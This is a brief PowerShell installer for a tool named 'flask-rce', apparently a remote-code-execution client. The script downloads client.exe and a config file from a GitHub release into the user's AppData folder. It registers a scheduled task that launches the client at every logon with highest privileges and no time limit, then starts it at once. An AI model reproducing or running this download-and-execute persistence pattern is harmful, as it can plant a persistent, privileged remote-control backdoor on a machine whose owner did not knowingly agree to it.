$installDir = "$env:APPDATA\flask-rce"
$taskName = "flask-rce"
Write-Host "Installing flask-rce..."
New-Item -ItemType Directory -Force -Path $installDir | Out-Null
Invoke-WebRequest -Uri "https://github.com/DapperPixelguy/flask-rce/releases/download/alpha/client.exe" -OutFile "$installDir\client.exe" -UseBasicParsing
Invoke-WebRequest -Uri "https://github.com/DapperPixelguy/flask-rce/releases/download/alpha/config.yaml" -OutFile "$installDir\config.yaml" -UseBasicParsing
$action = New-ScheduledTaskAction -Execute "$installDir\client.exe" -WorkingDirectory $installDir
$trigger = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit 0
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null
Start-ScheduledTask -TaskName $taskName
Write-Host "Done."
